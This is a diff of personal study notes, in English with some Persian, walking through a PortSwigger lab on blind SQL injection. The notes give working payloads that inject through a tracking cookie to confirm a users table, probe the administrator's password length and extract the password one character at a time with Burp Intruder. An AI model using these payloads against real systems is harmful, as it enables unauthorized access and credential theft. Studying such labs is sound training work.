@@ -1,25 +1,231 @@
+Collaborator:
+       https://portswigger.net/burp/documentation/collaborator
+
 Source: https://portswigger.net/web-security/sql-injection/blind
-2- Error-based SQL injection:
-       2-1- Exploiting blind SQL injection by triggering conditional errors
-       
-       The preceding technique will not work, because injecting different Boolean conditions
-       makes no difference to the application's responses.
+    Exploiting blind SQL injection by triggering conditional responses
+    …xyz' AND '1'='1
+    …xyz' AND '1'='2
 
-       This involves modifying the query so that it will cause a database error if the condition is true, 
-       but not if the condition is false.
-       این شامل اصلاح پرس و جو می شود تا اگر شرط درست باشد، خطای پایگاه داده ایجاد کند،
-       اما اگر شرط نادرست باشد، خطا ایجاد نمی کند.
+    The first of these values will cause the query to return results, 
+    because the injected AND '1'='1 condition is true, 
+    and so the "Welcome back" message will be displayed. 
+    Whereas the second value will cause the query to not return any results, 
+    because the injected condition is false, 
+    and so the "Welcome back" message will not be displayed. 
+    This allows us to determine the answer to any single injected condition, 
+    and so extract data one bit at a time. 
 
 
-       Very often, an unhandled error thrown by the database will cause some difference in 
-       the application's response (such as an error message)
+Notion Source: https://sinalalenakhsh.notion.site/3-Blind-91528a1d731045adb76da0b2122de0e7
 
-       xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
-       xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+Episode11- YouTube Channel AcronProject:
 
-       we can retrieve data in the way already described, 
-       by systematically testing one character at a time: 
-              xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+    Source: https://portswigger.net/web-security/sql-injection/blind
+    Title:  Lab: Blind SQL injection with conditional responses
+    Lab:    https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses    
+    
+    vulnerable parameter - tracking cookie
+    dont anything to show in browser = cant use UNION based injection
+    Target:
+        1- Enumerate the password of the administrator
+        2- Log in as the administrator user
+
+    Detection Black Box :
+        3- Send this packet HTTP to repeater by right click
+        4- intercept is off
+        5- Confirm that the parameter is vulnerable to blind SQLi
+        |    6- Query from Cookie to database vulnerable:
+        |        select tracking-id from tracking-table where trackingId = 'Paste here Cookie from browser'
+        |
+        |    7- Now, in fact, the correct logic should be like this:
+        |        # Secure logic code:
+        |            7-1- if True Return message
+        |            7-2- if tracking id exists           -------------> Query returns value   = True  => Wellcome back message
+        |            7-3- if the tracking id doesn't exists  ----------> Query returns nothing = False => no Wellcome back message
+        |        # 1-1 What if it was vulnerable?
+        |            7-4- if True + True  Return message !!!!
+        |            7-5- if tracking id exists + (Inject = True) -----> Query returns value   = True  => Wellcome back message !!!!!!! :/
+        |                                                But:                                                   in 8-3
+        |
+        |    8- #-Payload-1:
+        |                       First Tiny Payload -----> ' and 1=1-- 
+        |        8-1- select tracking-id from tracking-table where trackingId = 'Paste here Cookie from browser'
+        |                                                                                                      ' and 1=1--   
+        |        8-2- select tracking-id from tracking-table where trackingId = 'Paste here Cookie from browser' and 1=1--'
+        |        8-3- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and 1=1--'
+        |                                                                                       True
+        |           Relust = True             
+        |                                                                                       
+        |    9- #-Payload-2:
+        |        # 1-2 What if it was vulnerable?
+        |        if tracking id exists + (Inject = False) -----> Query returns value           = False => no Wellcome back message !!!!!!! :/
+        |        9-1- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and 1=0--'
+        |
+        |    Result ==> Payload1 + Payload2 = get information in blind SQLi 
+        |
+        10-Confirm that we have a users table:
+        |   7-4- if True + True  Return message !!!!
+        |   10-1- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV'
+        |   10-2- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV '
+        |   10-3- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' '
+        |   10-4- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV'  '
+        |   10-5- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and '
+        |   10-6- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and  '
+        |   10-7- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and True--' 
+                Blind SQL injection with conditional responses Examples  {
+                ۱- اگر قد تمام افراد این کلاس کمتر از ۱۷۰ سانتی باشه این کلاس برنده است
+                ۲- اگر قد تمامشون کمتر از ۱۷۰ باشه و سنشون بیشتر از ۱۰ سال باشه این کلاس برنده است
+                ۳- اگر تمام نمره هات بیشتر از ۱۵ باشه و مامانت ازت راضی باشه برات یه چیزی می خرم
+                
+                Result = True 
+                Result = Win
+                Result = accept
+                Result = passed
+                Result = elapsed
+                Result = قبول شده
+                تایید شده
+                پاس شده
+                برنده شده}
+        |   10-8- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (True)=True--'
+        |   10-9- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and True--'  
+        |   10-10- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select 'x' from users LIMIT 1)='x'--'
+        |
+        |   Result ==> users table exists in the database.
+        |
+        11- Confirm that username = ? exists users table: 
+        |   10-10- select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select 'x' from users LIMIT 1)='x'--'
+        |   11-1   select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username='administrator')='administrator'--'
+        |   Result = True so administrator user exists 
+        |
+        |   11-2   select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username='administrator123asd')='administrator123asd'--'
+        |   Result ==> False so administrator123asd user not exists
+        |
+        12- Enumerate the password of the administrator user:
+        |   11-1 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username='administrator')='administrator'--'
+        |   12-1 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select password from users where username='administrator')='password'--'
+        |                                                                                                                                                        = How ?
+        |   12-2 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--' = True/False?
+                                                                                                                                                                                                       if True so password is bigger than 1              
+        |   12-3 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username='administrator' and LENGTH(password)>2)='administrator'--' = True/False?
+        |   12-4 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username='administrator' and LENGTH(password)>50)='administrator'--'= True/False?
+        |                                                                                                                                                                                             .... = if it's False                      
+        13- Go with Intruder BurpSuite:
+        |   13-1  click ---> Clear $
+        |   13-2  Highlight 1 on this query:
+        |       select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username='administrator' and LENGTH(password)>2)='administrator'--'
+        |
+        |   13-3  Click ---> Add $
+        |   13-4  Attack type = Sniper
+        |   13-5  go to Paloads Tab
+        |   13-6  Click Payload type = Numers 
+        |   13-7  on Payloads Options ---> Number range ---> Type = Sequential
+        |   13-8  From = 1 
+        |   13-9  To   = 50 
+        |   13-10 Step = 1
+        |   13-11 Start attack:
+        |         
+        |         Look at the Length in Result BurpSuite ?
+        |         when is this change so is other response
+        |   
+        |   Result = Get length number the password characters
+        |
+        |   another way to find this: 
+        |       Click on Filter: ---> Filter by search term ---> welcome ---> Apply
+        |       Result = Get just packets have [welcome] word.
+        |
+        14- Get every true characters password with length I reach it:
+        |   14-1-:
+        |   just for rewiew    
+        |       select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (True)=True--'
+        |       select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select substring(password,1,1) from users where username='administrator')='a'--' 
+        |                                                                                                                                        = if is True = a is first character 
+        15- Send in Intruder       
+        16- Like 13-1 to 13-11 for "a" 
+        |    16-1 Payloads Tab = Brute forcer
+        |    16-2 Min length = 1
+        |    16-3 Max length = 1
+        |
+        |         Look at the Length in Relust BurpSuite ?
+        |         when is this change so is other response
+        |   
+        17- with True answer response ---> Go to Intruder ----> Positions ----> Attack Type = Cluster bomb
+        18- use this query-:
+        |                                                                                                                    $1$                                               $a$
+        |                                                              'asDAWF2$DSGX!123!EXV' and (select substring(password,1,1) from users where username='administrator')='a'--        
+        |    select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select substring(password,$1$,1) from users where username='administrator')='$a$'--'
+        |
+        19- Go to Payloads tab-:
+        |     19-1 Payload set 1 & 2
+        |     19-2 on Payloads Options ---> From = 1 && To = length of reach && step = 1
+        |                               1- axxxxxxxxxx
+        |                               2- adxxxxxxxxx
+        |                               3- adQxxxxxxxx
+        |                               4- adQ7xxxxxxx
+        |
+                Password = 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+                           63hbelr10ywa9h1aofp7                        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
